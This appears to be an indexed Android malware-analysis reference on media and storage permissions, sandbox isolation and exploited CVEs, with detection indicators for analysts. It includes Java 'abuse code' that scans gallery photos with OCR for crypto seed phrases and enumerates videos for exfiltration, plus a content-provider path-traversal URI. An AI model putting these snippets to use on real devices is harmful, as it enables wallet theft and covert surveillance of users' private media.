Malware","text":""},{"location":"permissions/storage/read-media-images/#photo-exfiltration","title":"Photo Exfiltration","text":"<p>Steal personal photos for blackmail, identity theft, or intelligence gathering. Screenshots may contain sensitive information (banking app screens, private messages, authentication codes).</p>"},{"location":"permissions/storage/read-media-images/#exif-location-data","title":"EXIF Location Data","text":"<p>Photos contain GPS coordinates in EXIF metadata, revealing where and when they were taken, even without location permission.</p>"},{"location":"permissions/storage/read-media-images/#document-theft-via-screenshots","title":"Document Theft via Screenshots","text":"<p>Users often screenshot sensitive documents, banking details, and passwords. These are accessible through this permission.</p>"},{"location":"permissions/storage/read-media-images/#notable-families","title":"Notable Families","text":"Family Usage SparkCat Uses Google ML Kit OCR to scan gallery photos for cryptocurrency wallet seed phrases SpyAgent OCR-based scanning of device photos for crypto mnemonic seed phrases targeting Korean users SpyLoan Exfiltrates personal photos for blackmail and extortion of loan defaulters <p>SparkCat and SpyAgent represent an emerging threat pattern: on-device OCR to extract cryptocurrency recovery phrases from screenshots. Both families scan the gallery using <code>MediaStore.Images</code>, process each image through text recognition, and selectively exfiltrate images matching BIP-39 seed phrase patterns. SpyLoan takes a different approach, collecting personal photos during \"identity verification\" and weaponizing them if borrowers default on predatory loans.</p>"},{"location":"permissions/storage/read-media-images/#read_external_storage-vs-granular-permissions","title":"READ_EXTERNAL_STORAGE vs Granular Permissions","text":"<p>SparkCat is a notable example of the permission transition in action. Its manifest declares both <code>READ_EXTERNAL_STORAGE</code> (for pre-Android 13 devices) and <code>READ_MEDIA_IMAGES</code> (for API 33+), ensuring the OCR scanning works across all Android versions. SpyLoan similarly declares both because its Play Store distribution requires targeting current API levels.</p> <ul> <li>SparkCat declares both <code>READ_EXTERNAL_STORAGE</code> and <code>READ_MEDIA_IMAGES</code> in its manifest</li> <li>Anubis uses <code>READ_EXTERNAL_STORAGE</code> for file browsing and exfiltration on older Android versions</li> <li>Mamont uses <code>READ_EXTERNAL_STORAGE</code> for photo and file access</li> <li>FireScam uses <code>READ_EXTERNAL_STORAGE</code> for device storage access</li> </ul> <p>Families that only declare <code>READ_EXTERNAL_STORAGE</code> without <code>READ_MEDIA_IMAGES</code> will lose photo access on devices running Android 13+ if they target API 33+. However, many sideloaded malware families deliberately target API 32 or lower to avoid the granular permission split entirely.</p>"},{"location":"permissions/storage/read-media-images/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class ImageScanner {\n\n    private final ContentResolver resolver;\n    private final TextRecognizer recognizer;\n    private final List&lt;String&gt; seedWords;\n\n    public ImageScanner(ContentResolver resolver, List&lt;String&gt; seedWords) {\n        this.resolver = resolver;\n        this.seedWords = seedWords;\n        this.recognizer = TextRecognition.getClient(\n            new TextRecognizerOptions.Builder().build()\n        );\n    }\n\n    public void scanGalleryForSeedPhrases() {\n        String[] projection = {\n            MediaStore.Images.Media._ID,\n            MediaStore.Images.Media.DISPLAY_NAME,\n            MediaStore.Images.Media.DATE_ADDED\n        };\n\n        Cursor cursor = resolver.query(\n            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,\n            projection,\n            null, null,\n            MediaStore.Images.Media.DATE_ADDED + \" DESC\"\n        );\n\n        if (cursor == null) return;\n\n        while (cursor.moveToNext()) {\n            long id = cursor.getLong(0);\n            Uri imageUri = ContentUris.withAppendedId(\n                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id\n            );\n            processImage(imageUri);\n        }\n        cursor.close();\n    }\n\n    private void processImage(Uri uri) {\n        try {\n            Bitmap bitmap = MediaStore.Images.Media.getBitmap(resolver, uri);\n            InputImage inputImage = InputImage.fromBitmap(bitmap, 0);\n            recognizer.process(inputImage)\n                .addOnSuccessListener(text -&gt; {\n                    String detected = text.getText().toLowerCase();\n                    int matchCount = 0;\n                    for (String word : seedWords) {\n                        if (detected.contains(word)) matchCount++;\n                    }\n                    if (matchCount &gt;= 8) {\n                        exfiltrateImage(uri);\n                    }\n                });\n        } catch (Exception e) {\n        }\n    }\n\n    private void exfiltrateImage(Uri uri) {\n    }\n}\n</code></pre> <p>This pattern mirrors SparkCat's approach: enumerate all images, run OCR on each, match against BIP-39 wordlist patterns, and selectively exfiltrate images that contain enough seed phrase words to indicate a wallet backup screenshot.</p>"},{"location":"permissions/storage/read-media-images/#android-version-changes","title":"Android Version Changes","text":"<p>Android 13 (API 33): introduced as replacement for <code>READ_EXTERNAL_STORAGE</code> for media access. Apps targeting API 33+ must request this specific permission for image access.</p> <p>Android 14 (API 34): users can grant partial access (select specific photos) instead of full access. The app may not see all images. This significantly impacts OCR-based stealers like SparkCat, as partial access limits the gallery surface available for scanning. However, malware can re-prompt the user to \"select all\" or use social engineering to obtain full access.</p> <p>Android 14 (API 34): <code>READ_MEDIA_IMAGES</code> grouped with <code>READ_MEDIA_VIDEO</code> in the <code>READ_MEDIA_VISUAL</code> permission group. Granting one grants the other.</p> <p>Pre-Android 13: apps use <code>READ_EXTERNAL_STORAGE</code> which grants access to all file types including images, making image-specific abuse harder to distinguish.</p>"},{"location":"permissions/storage/read-media-images/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_MEDIA_IMAGES\" /&gt;\n</code></pre>"},{"location":"permissions/storage/read-media-images/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li>Google ML Kit or Tesseract OCR library bundled in an app that has no text-recognition feature in its UI is a strong indicator of SparkCat-style abuse.</li> <li>Look for <code>MediaStore.Images</code> queries combined with image processing APIs (<code>Bitmap</code>, <code>InputImage</code>, <code>TextRecognizer</code>).</li> <li>Apps that enumerate all images in the gallery without displaying them to the user are performing reconnaissance or bulk scanning.</li> <li>Check for EXIF metadata extraction -- <code>ExifInterface</code> usage combined with <code>INTERNET</code> indicates location data exfiltration.</li> <li><code>ContentObserver</code> registration on <code>MediaStore.Images</code> for real-time monitoring of new screenshots is common in stalkerware and OCR stealers.</li> <li>On pre-Android 13 samples, <code>READ_EXTERNAL_STORAGE</code> with <code>MediaStore.Images</code> queries achieves the same result -- the broader permission masks image-specific intent.</li> </ul>"},{"location":"permissions/storage/read-media-images/#see-also","title":"See Also","text":"<ul> <li>READ_EXTERNAL_STORAGE -- the pre-Android 13 permission that granted access to all media types including images</li> <li>READ_MEDIA_VIDEO -- grouped with <code>READ_MEDIA_IMAGES</code> in the <code>READ_MEDIA_VISUAL</code> permission group on Android 14+ (granting one grants the other)</li> <li>READ_MEDIA_AUDIO -- companion granular permission for audio access</li> <li>Clipboard Hijacking -- related cryptocurrency theft technique that targets seed phrases copied to clipboard rather than photographed</li> </ul>"},{"location":"permissions/storage/read-media-video/","title":"READ_MEDIA_VIDEO","text":"<p>Allows reading video files from shared storage via <code>MediaStore</code>. Granular media permission introduced in Android 13.</p>"},{"location":"permissions/storage/read-media-video/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_MEDIA_VIDEO</code> Protection Level <code>dangerous</code> Permission Group <code>READ_MEDIA_VISUAL</code> (Android 14+) Grant Method Runtime permission dialog Introduced API 33 (Android 13)"},{"location":"permissions/storage/read-media-video/#what-it-enables","title":"What It Enables","text":"<p>Query <code>MediaStore.Video</code> for all video files on the device. Includes metadata (duration, resolution, GPS coordinates, timestamps).</p>"},{"location":"permissions/storage/read-media-video/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/read-media-video/#video-exfiltration","title":"Video Exfiltration","text":"<p>Steal personal videos for blackmail. Screen recordings may contain sensitive application usage.</p>"},{"location":"permissions/storage/read-media-video/#large-file-exfiltration","title":"Large File Exfiltration","text":"<p>Videos are large files. Exfiltrating them requires significant bandwidth, making this less practical for high-volume operations but valuable for targeted surveillance.</p>"},{"location":"permissions/storage/read-media-video/#notable-families","title":"Notable Families","text":"Family Usage SpyLoan Exfiltrates personal videos for blackmail against borrowers who default on predatory loans <p>SpyLoan apps request video access under the guise of \"identity verification\" during the loan application process. If the borrower fails to repay, operators threaten to distribute private videos to the borrower's contacts.</p>"},{"location":"permissions/storage/read-media-video/#read_external_storage-vs-granular-permissions","title":"READ_EXTERNAL_STORAGE vs Granular Permissions","text":"<p>The majority of malware families that exfiltrate video files predate Android 13 and request <code>READ_EXTERNAL_STORAGE</code> for broad file access. SpyLoan is notable for targeting API 33+ with the granular permission because its Play Store distribution requires compliance with current API level targeting requirements.</p> <ul> <li>Families like SpyNote, PJobRAT, and Hermit use <code>READ_EXTERNAL_STORAGE</code> for general file access that includes video</li> <li>Sideloaded malware often targets older API levels to avoid granular permission requirements entirely</li> <li>Play Store-distributed malware (like SpyLoan) must target recent API levels and declare <code>READ_MEDIA_VIDEO</code> explicitly</li> </ul>"},{"location":"permissions/storage/read-media-video/#stalkerware","title":"Stalkerware","text":"<p>Stalkerware families commonly request <code>READ_MEDIA_VIDEO</code> to monitor the victim's recorded content. Screen recordings are particularly valuable as they may capture banking app usage, private messages, and authentication flows.</p>"},{"location":"permissions/storage/read-media-video/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class VideoExfiltrator {\n\n    private final ContentResolver resolver;\n\n    public VideoExfiltrator(ContentResolver resolver) {\n        this.resolver = resolver;\n    }\n\n    public List&lt;VideoMetadata&gt; enumerateVideos() {\n        List&lt;VideoMetadata&gt; results = new ArrayList&lt;&gt;();\n        String[] projection = {\n            MediaStore.Video.Media._ID,\n            MediaStore.Video.Media.DISPLAY_NAME,\n            MediaStore.Video.Media.SIZE,\n            MediaStore.Video.Media.DURATION,\n            MediaStore.Video.Media.DATE_ADDED\n        };\n\n        Cursor cursor = resolver.query(\n            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,\n            projection,\n            null, null,\n            MediaStore.Video.Media.DATE_ADDED + \" DESC\"\n        );\n\n        if (cursor == null) return results;\n\n        while (cursor.moveToNext()) {\n            VideoMetadata meta = new VideoMetadata();\n            meta.id = cursor.getLong(0);\n            meta.name = cursor.getString(1);\n            meta.size = cursor.getLong(2);\n            meta.duration = cursor.getLong(3);\n            meta.dateAdded = cursor.getLong(4);\n            meta.uri = ContentUris.withAppendedId(\n                MediaStore.Video.Media.EXTERNAL_CONTENT_URI, meta.id\n            );\n            results.add(meta);\n        }\n        cursor.close();\n        return results;\n    }\n\n    public byte[] extractThumbnail(long videoId) {\n        Uri uri = ContentUris.withAppendedId(\n            MediaStore.Video.Media.EXTERNAL_CONTENT_URI, videoId\n        );\n        try {\n            Bitmap thumb = resolver.loadThumbnail(uri, new Size(320, 240), null);\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            thumb.compress(Bitmap.CompressFormat.JPEG, 60, baos);\n            return baos.toByteArray();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}\n</code></pre> <p>Malware often exfiltrates video thumbnails first to minimize bandwidth usage, then selectively downloads full videos based on operator interest. The metadata enumeration provides duration, size, and timestamps that allow operators to prioritize targets.</p>"},{"location":"permissions/storage/read-media-video/#android-version-changes","title":"Android Version Changes","text":"<p>Android 13 (API 33): <code>READ_MEDIA_VIDEO</code> introduced as a replacement for <code>READ_EXTERNAL_STORAGE</code> for video file access. Apps targeting API 33+ must request this specific permission.</p> <p>Android 14 (API 34): <code>READ_MEDIA_VIDEO</code> grouped with <code>READ_MEDIA_IMAGES</code> in the <code>READ_MEDIA_VISUAL</code> permission group. Granting one grants the other. Users can also grant partial access (select specific files) instead of full access through the photo picker.</p> <p>Pre-Android 13: apps use <code>READ_EXTERNAL_STORAGE</code> which grants access to all media types, making video-specific abuse less distinguishable from general storage access.</p>"},{"location":"permissions/storage/read-media-video/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_MEDIA_VIDEO\" /&gt;\n</code></pre>"},{"location":"permissions/storage/read-media-video/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li>Apps requesting <code>READ_MEDIA_VIDEO</code> combined with <code>INTERNET</code> and <code>FOREGROUND_SERVICE</code> but lacking video playback or editing UI are suspicious.</li> <li>Look for thumbnail extraction patterns -- malware that loads thumbnails for all videos without displaying them to the user is performing reconnaissance.</li> <li>Check for <code>ContentObserver</code> registration on <code>MediaStore.Video</code> to detect real-time monitoring of new video files.</li> <li>Bandwidth patterns are a strong indicator: video exfiltration produces large sustained uploads that stand out in network analysis.</li> <li>On Android 14+, granting <code>READ_MEDIA_IMAGES</code> also grants <code>READ_MEDIA_VIDEO</code>, so malware may only request images permission to silently gain video access.</li> <li>On pre-Android 13 samples, <code>READ_EXTERNAL_STORAGE</code> with <code>MediaStore.Video</code> queries achieves the same result -- the broader permission masks video-specific intent.</li> </ul>"},{"location":"permissions/storage/read-media-video/#see-also","title":"See Also","text":"<ul> <li>READ_EXTERNAL_STORAGE -- the pre-Android 13 permission that granted access to all media types including video</li> <li>READ_MEDIA_IMAGES -- grouped with <code>READ_MEDIA_VIDEO</code> in the <code>READ_MEDIA_VISUAL</code> permission group on Android 14+</li> <li>READ_MEDIA_AUDIO -- companion granular permission for audio access</li> <li>Screen Capture -- screen recordings accessed via this permission may reveal sensitive app usage</li> </ul>"},{"location":"permissions/storage/write-external-storage/","title":"WRITE_EXTERNAL_STORAGE","text":"<p>Grants write access to shared/external storage (<code>/sdcard/</code>). Enables creating, modifying, and deleting files on the device's shared storage. Used by malware for payload dropping, file replacement attacks, and staging exfiltration data. Functionally deprecated in Android 11 with scoped storage enforcement.</p>"},{"location":"permissions/storage/write-external-storage/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_EXTERNAL_STORAGE</code> Protection Level <code>dangerous</code> Permission Group <code>STORAGE</code> Grant Method Runtime permission dialog Introduced API 4 Deprecated API 29 (Android 10) Max Target SDK Effect API 29 (no effect for apps targeting API 30+)"},{"location":"permissions/storage/write-external-storage/#what-it-enables","title":"What It Enables","text":"<p>On Android 9 and below, full write access to the entire <code>/sdcard/</code> directory tree. The app can create, modify, and delete any file on shared storage.</p> <p>On Android 10 (API 29) targeting API 29, the permission still works if the app sets <code>requestLegacyExternalStorage=\"true\"</code>. Without this flag, the app is limited to its own scoped directory.</p> <p>On Android 11+ (API 30+), <code>WRITE_EXTERNAL_STORAGE</code> has no effect regardless of target SDK. Apps can only write to:</p> <ul> <li>Their own app-specific external directory (<code>Android/data/&lt;package&gt;/</code>)</li> <li><code>MediaStore</code> entries they created</li> <li>Locations granted via SAF (Storage Access Framework)</li> </ul> <p>Historically, granting <code>WRITE_EXTERNAL_STORAGE</code> implicitly granted <code>READ_EXTERNAL_STORAGE</code> as well, since they were in the same permission group.</p>"},{"location":"permissions/storage/write-external-storage/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/write-external-storage/#payload-dropping","title":"Payload Dropping","text":"<p>Write malicious files to predictable locations for later use:</p> Payload Type Technique APK files Drop to <code>Download/</code> and prompt user to install via <code>REQUEST_INSTALL_PACKAGES</code> or social engineering DEX files Write to shared storage, load dynamically via <code>DexClassLoader</code> Native libraries (.so) Drop and load via <code>System.load()</code> with absolute path Scripts Stage shell scripts for execution via other exploit chains"},{"location":"permissions/storage/write-external-storage/#media-file-jacking","title":"Media File Jacking","text":"<p>Demonstrated by Symantec in 2019 against WhatsApp and Telegram. The attack works by monitoring shared storage with a <code>FileObserver</code> and replacing media files between the time they are written and when the receiving app displays them. For example:</p> <ol> <li>WhatsApp saves an incoming image to <code>/sdcard/WhatsApp/Media/</code></li> <li>Malware detects the new file via <code>FileObserver</code></li> <li>Malware replaces the image with a modified version (altered bank account numbers in a payment screenshot, for instance)</li> <li>User sees the manipulated image in the WhatsApp chat</li> </ol> <p>This attack was viable on Android 9 and below. Scoped storage mitigated it by preventing cross-app file access.</p>"},{"location":"permissions/storage/write-external-storage/#file-replacement","title":"File Replacement","text":"<p>Beyond media jacking, write access enables replacing any file on shared storage:</p> <ul> <li>Swap legitimate APKs in the Downloads folder with trojanized versions</li> <li>Modify downloaded configuration files</li> <li>Alter documents before the user opens them</li> <li>Overwrite OTA update files if stored on external storage</li> </ul>"},{"location":"permissions/storage/write-external-storage/#staging-for-exfiltration","title":"Staging for Exfiltration","text":"<p>Some malware writes collected data (screenshots, keylog output, recorded audio) to shared storage as a staging area before exfiltration. This avoids filling app-private storage and can survive app uninstall.</p>"},{"location":"permissions/storage/write-external-storage/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): apps can write to their own app-specific directory on external storage (<code>Android/data/&lt;package&gt;/</code>) without <code>WRITE_EXTERNAL_STORAGE</code>. The permission is only needed for writing outside this directory.</p> <p>Android 6.0 (API 23): runtime permission required. Granting write implicitly granted read (same permission group).</p> <p>Android 10 (API 29): scoped storage introduced. <code>WRITE_EXTERNAL_STORAGE</code> deprecated. Apps targeting API 29 can opt out with <code>requestLegacyExternalStorage=\"true\"</code>.</p> <p>Android 11 (API 30): scoped storage enforced. <code>WRITE_EXTERNAL_STORAGE</code> grants no additional access for apps targeting API 30+. The permission exists in the manifest but is ignored by the system. Apps needing broad write access must use <code>MANAGE_EXTERNAL_STORAGE</code>.</p> <p>Android 13 (API 33): the permission remains in the framework for backward compatibility but is effectively dead for modern apps.</p>"},{"location":"permissions/storage/write-external-storage/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;\n</code></pre> <p>Key indicators:</p> <ul> <li>Combined with <code>REQUEST_INSTALL_PACKAGES</code>: payload drop and sideload pipeline</li> <li><code>FileObserver</code> usage on shared storage directories: potential media file jacking</li> <li>Writing to paths outside the app's own <code>Android/data/</code> directory</li> <li><code>requestLegacyExternalStorage=\"true\"</code> in the application tag for apps targeting API 29</li> <li>Apps targeting API 28 or lower to retain full write access on modern devices</li> <li><code>DexClassLoader</code> or <code>System.load()</code> with paths pointing to shared storage: dynamic payload loading from dropped files</li> </ul>"},{"location":"platform-abuse/","title":"Platform Abuse","text":"<p>Android's security model exists to protect users, apps, and data. Every mechanism documented here has been bypassed, circumvented, or abused in practice by malware, exploit chains, or security researchers. The focus is on how these protections work, where they fail, and how they are defeated.</p> <p>The Permissions section documents Android's permission system and how every abusable permission is exploited by malware.</p>"},{"location":"platform-abuse/#security-architecture","title":"Security Architecture","text":"Layer Mechanism How It Is Abused Hardware Verified Boot, TEE/StrongBox, hardware-backed Keystore Firmware persistence, key extraction, bootloader exploits Kernel SELinux, seccomp-bpf, dm-verity Privilege escalation, policy bypass, kernel exploits Framework App sandbox, permission model, Play Integrity Sandbox escapes, permission abuse, attestation bypass Application Scoped storage, biometric authentication, app signing Storage access, authentication bypass, signature verification"},{"location":"platform-abuse/#pages","title":"Pages","text":"Page Scope App Sandbox Process isolation, UID-based separation, IPC restrictions, sandbox escape history SELinux Mandatory access control on Android, policy structure, known bypasses, context transitions Verified Boot Boot chain verification, dm-verity, AVB, rollback protection, bootloader unlocking implications Keystore Hardware-backed key storage, TEE vs StrongBox, key attestation, extraction research Play Integrity SafetyNet to Play Integrity evolution, attestation verdicts, bypass techniques, device trust Biometric Authentication BiometricPrompt, CryptoObject binding, fallback to PIN, downgrade attacks"},{"location":"platform-abuse/#planned","title":"Planned","text":"Page Scope Scoped Storage Storage access framework, MediaStore restrictions, legacy bypass, malware adaptation Permission Model Runtime permissions, auto-revoke, one-time permissions, restricted settings, grant flow abuse"},{"location":"platform-abuse/#cross-references","title":"Cross-References","text":"<ul> <li>Accessibility Abuse bypasses many platform mechanisms through the accessibility API</li> <li>Persistence Techniques details how malware survives across reboots despite platform restrictions</li> <li>Dynamic Code Loading circumvents app signing verification by loading unsigned code at runtime</li> <li>Permissions documents how every abusable Android permission is exploited</li> </ul>"},{"location":"platform-abuse/app-sandbox/","title":"App Sandbox","text":"<p>Android's primary isolation mechanism. Every app runs in its own process under a unique Linux UID, confined by SELinux mandatory access control. The sandbox is the foundation of Android's security model, and breaking it is the highest-value target for exploit chains.</p>"},{"location":"platform-abuse/app-sandbox/#process-isolation-model","title":"Process Isolation Model","text":""},{"location":"platform-abuse/app-sandbox/#uid-per-app","title":"UID-Per-App","text":"<p>At install time, the package manager assigns each app a unique Linux UID (typically in the range 10000-19999, formatted as <code>u0_a0</code> through <code>u0_a9999</code>). This UID determines file access, IPC permissions, and network socket ownership.</p> Property Value UID range 10000 -- 19999 (per user profile) GID Same as UID by default Supplementary GIDs Added for specific permissions (e.g., <code>inet</code> for network access) Process name App package name Home directory <code>/data/data/&lt;package&gt;/</code> (owned by app UID) <p>Each app's data directory is created with permissions <code>0700</code> and owned by the app's UID. No other app (except root and system) can read or write to it.</p>"},{"location":"platform-abuse/app-sandbox/#zygote-fork-model","title":"Zygote Fork Model","text":"<p>All app processes are forked from the Zygote process, which pre-loads the Android framework classes. This means every app starts with the same base framework state, and isolation is enforced post-fork through UID assignment and SELinux context transition.</p> <p>The fork-based model means all apps initially share the same memory pages (copy-on-write). This has historically enabled side-channel attacks where one app can infer another app's behavior from memory access patterns.</p>"},{"location":"platform-abuse/app-sandbox/#selinux-enforcement","title":"SELinux Enforcement","text":""},{"location":"platform-abuse/app-sandbox/#app-security-contexts","title":"App Security Contexts","text":"<p>Android assigns SELinux security contexts to app processes based on their trust level:</p> Context Assignment Capabilities <code>untrusted_app</code> Third-party apps from Play Store or sideloaded Most restricted; standard app sandbox <code>untrusted_app_25</code> Apps targeting API 25 or below Slightly more permissive (legacy compatibility) <code>untrusted_app_27</code> Apps targeting API 27 or below Legacy compatibility for Oreo-era apps <code>untrusted_app_29</code> Apps targeting API 29 or below Scoped storage exemptions <code>untrusted_app_32</code> Apps targeting API 32 or below Bluetooth permission compatibility <code>platform_app</code> Apps signed with the platform key Access to platform-protected APIs <code>system_app</code> Apps in <code>/system/app/</code> or <code>/system/priv-app/</code> System-level access <code>isolated_app</code> Isolated processes (e.g., WebView renderers) Most restricted context, no network <code>priv_app</code> Privileged system apps <code>signatureOrSystem</code> permissions <p>The context <code>u:r:untrusted_app:s0:c512,c768</code> breaks down as:</p> Field Value Meaning User <code>u</code> SELinux user (always <code>u</code> on Android) Role <code>r</code> SELinux role (always <code>r</code> for processes) Type <code>untrusted_app</code> Process type determining allowed operations Sensitivity <code>s0</code> MLS sensitivity level Categories <code>c512,c768</code> Per-app categories for app-to-app isolation"},{"location":"platform-abuse/app-sandbox/#neverallow-rules","title":"Neverallow Rules","text":"<p>Android's SELinux policy includes <code>neverallow</code> rules that are enforced at compile time and verified by CTS (Compatibility Test Suite). These rules guarantee certain access patterns are impossible regardless of any <code>allow</code> rules:</p> <pre><code>neverallow untrusted_app system_data_file:file { create write };\nneverallow untrusted_app kernel:security { load_policy setenforce };\nneverallow untrusted_app self:capability { sys_admin sys_boot };\n</code></pre> <p>OEM policy customizations must not violate these rules. 8kSec's research on Android SELinux internals documents how vendor policy additions sometimes inadvertently weaken these guarantees.</p>"},{"location":"platform-abuse/app-sandbox/#ipc-boundaries","title":"IPC Boundaries","text":"<p>Inter-process communication is how apps interact with each other and with system services. Each IPC mechanism represents a potential sandbox escape vector.</p>"},{"location":"platform-abuse/app-sandbox/#binder","title":"Binder","text":"<p>The primary IPC mechanism in Android. All system service calls (<code>ActivityManager</code>, <code>PackageManager</code>, <code>WindowManager</code>, etc.) go through Binder. The kernel Binder driver (<code>/dev/binder</code>) mediates all transactions and enforces UID-based access control.</p> <p>Binder is the most security-critical component in the Android kernel because it mediates every cross-process interaction. A vulnerability in the Binder driver means sandbox escape.</p>"},{"location":"platform-abuse/app-sandbox/#intents","title":"Intents","text":"<p>Higher-level IPC built on top of Binder. Intents can carry data (<code>extras</code>, <code>URIs</code>) and trigger components in other apps. Poorly exported components are a major attack surface -- see Intent Hijacking and Content Provider Attacks.</p>"},{"location":"platform-abuse/app-sandbox/#content-providers","title":"Content Providers","text":"<p>SQL-backed or file-backed data stores that other apps can query. Exported content providers with insufficient permission checks allow data theft. Oversecured's research found that more than 80% of apps contain content provider vulnerabilities, including path traversal, SQL injection, and URI grant abuse.</p> <p>Content provider path traversal allows an attacker to read arbitrary files from the target app's sandbox by manipulating the URI path:</p> <pre><code>content://com.vulnerable.app.provider/../../../shared_prefs/secrets.xml\n</code></pre> <p>Oversecured documented how intent redirection vulnerabilities allow access to non-exported content providers by exploiting intermediate activities that pass attacker-controlled intents.</p>"},{"location":"platform-abuse/app-sandbox/#sandbox-escape-history","title":"Sandbox Escape History","text":""},{"location":"platform-abuse/app-sandbox/#cve-2019-2215-binder-use-after-free","title":"CVE-2019-2215: Binder Use-After-Free","text":"<p>The most significant Android sandbox escape in the wild. Discovered by Project Zero in October 2019, this vulnerability was a use-after-free in the Binder kernel driver exploited by NSO Group's Pegasus spyware.</p> Detail Value CVE CVE-2019-2215 Component Binder driver (<code>binder.c</code>) Type Use-after-free Impact Kernel privilege escalation from app sandbox Exploited by NSO Group (Pegasus) Affected devices Pixel 1/2, Samsung S7/S8/S9, Huawei P20, Xiaomi devices, LG, Oppo Root cause <code>binder_thread</code> struct freed via <code>BINDER_THREAD_EXIT</code> while epoll still holds a reference to its <code>wait_queue_head_t</code> <p>The exploit chain: Chrome renderer exploit (for remote code execution) chained with CVE-2019-2215 (for kernel privilege escalation) to achieve full device compromise from a malicious webpage. The bug existed in the upstream Linux kernel and remained unpatched in Android for nearly two years despite being fixed upstream.</p>"},{"location":"platform-abuse/app-sandbox/#cve-2024-49415-samsung-zero-click","title":"CVE-2024-49415: Samsung Zero-Click","text":"<p>Discovered by Project Zero researcher Natalie Silvanovich, this vulnerability (CVSS 8.1) in Samsung's Monkey's Audio codec allowed code execution without user interaction on Samsung devices running Android 12-14. When Google Messages was configured for RCS, the transcription service decoded incoming audio locally before user interaction, providing a zero-click attack surface.</p>"},{"location":"platform-abuse/app-sandbox/#modern-in-the-wild-android-exploit-2023","title":"Modern In-the-Wild Android Exploit (2023)","text":"<p>Project Zero analyzed a full exploit chain targeting Samsung devices, combining multiple vulnerabilities:</p> Stage CVE Component Purpose Initial access Multiple Chrome/Samsung Internet Remote code execution in renderer Sandbox escape Multiple GPU driver Escape browser sandbox Kernel CVE-2023-0266 ALSA driver Kernel privilege escalation Persistence N/A SELinux policy modification Maintain access across reboot"},{"location":"platform-abuse/app-sandbox/#cve-2024-43093-android-framework-escalation","title":"CVE-2024-43093: Android Framework Escalation","text":"<p>Actively exploited in the wild, this vulnerability in the Android Framework's System component allowed privilege escalation on Android 11-14. Google confirmed limited, targeted exploitation.</p>"},{"location":"platform-abuse/app-sandbox/#historical-cve-timeline","title":"Historical CVE Timeline","text":"CVE Year Component Impact CVE-2014-3153 2014 futex (kernel) Privilege escalation (TowelRoot) CVE-2015-1805 2015 pipe_read/pipe_write (kernel) Root from app (used in-the-wild) CVE-2016-5195 2016 Copy-on-write (kernel) Dirty COW, root from any process CVE-2019-2215 2019 Binder driver Sandbox escape (Pegasus) CVE-2021-0920 2021 Unix socket garbage collection Privilege escalation (in-the-wild) CVE-2021-1048 2021 epoll (kernel) Use-after-free (in-the-wild) CVE-2023-0266 2023 ALSA sound driver Samsung exploit chain CVE-2024-43093 2024 Android Framework System privilege escalation"},{"location":"platform-abuse/app-sandbox/#shared-uid-attack-surface","title":"Shared UID Attack Surface","text":"<p>The deprecated <code>android:sharedUserId</code> manifest attribute allows apps signed with the same certificate to run under the same UID, sharing data directories and process space.</p> Risk Detail Certificate compromise If a developer's signing key is compromised, any app signed with it can access all shared UID apps' data Legacy OEM bundles Pre-installed OEM apps sharing <code>android.uid.system</code> gain system-level access Privilege inheritance A vulnerable app sharing a UID with a privileged app inherits its capabilities <p>Maddie Stone's Black Hat 2019 research on pre-installed Android apps showed how shared UIDs among OEM apps created attack chains where a vulnerability in one low-privilege pre-installed app could escalate to system-level access through a shared UID partner.</p> <p><code>sharedUserId</code> was deprecated in API 29 (Android 10). Starting in Android 15, non-system platform-signed apps must be explicitly allowlisted to join shared UIDs.</p>"},{"location":"platform-abuse/app-sandbox/#proc-filesystem-information-leaks","title":"/proc Filesystem Information Leaks","text":"<p>The <code>/proc</code> filesystem exposes kernel and process information. Despite progressive restrictions across Android versions, side-channel attacks remain possible.</p> Path Information Leaked Restricted Since <code>/proc/&lt;pid&gt;/stat</code> Stack pointer (ESP), CPU time Partial in Android 7 <code>/proc/&lt;pid&gt;/status</code> UID, memory maps Android 7 (other app PIDs) <code>/proc/interrupts</code> Global interrupt statistics Android 8 <code>/proc/stat</code> Aggregate CPU usage Android 8 <code>/proc/meminfo</code> System memory state Still accessible <code>/proc/net/tcp</code> Open TCP connections Android 10 (per-app network namespace) <p>ProcHarvester research demonstrated that accessible <code>/proc</code> data allowed inferring app launches from a set of 100 apps with 96% accuracy on Android 7, and side-channel timing from <code>/proc/&lt;pid&gt;/stat</code> could recover soft keyboard input.</p> <p>A zero-permission app can still determine system memory pressure, CPU usage patterns, and (on older versions) network connections. Combined with timing analysis, this enables activity fingerprinting without any permissions.</p>"},{"location":"platform-abuse/app-sandbox/#detection-during-analysis","title":"Detection During Analysis","text":"Sandbox Integrity Checks <ul> <li>Verify SELinux is enforcing: <code>getenforce</code> should return <code>Enforcing</code></li> <li>Check app SELinux context: <code>ps -Z | grep &lt;package&gt;</code></li> <li>Verify file permissions on data directories: <code>ls -la /data/data/&lt;package&gt;/</code></li> <li>Check for shared UIDs in manifest: <code>android:sharedUserId</code></li> <li>Monitor Binder transactions: <code>adb shell dumpsys binder_logs</code></li> </ul> Sandbox Escape Indicators <ul> <li>App process running as UID 0 (root)</li> <li>SELinux context changed from <code>untrusted_app</code> to another domain</li> <li>App accessing files outside its <code>/data/data/</code> directory</li> <li>Kernel exploit artifacts (modified <code>/proc/version</code>, unusual kernel modules)</li> <li>Binder transactions to <code>su</code> daemon or Magisk</li> </ul>"},{"location":"platform-abuse/app-sandbox/#cross-references","title":"Cross-References","text":"<ul> <li>Content Provider Attacks -- sandbox boundary 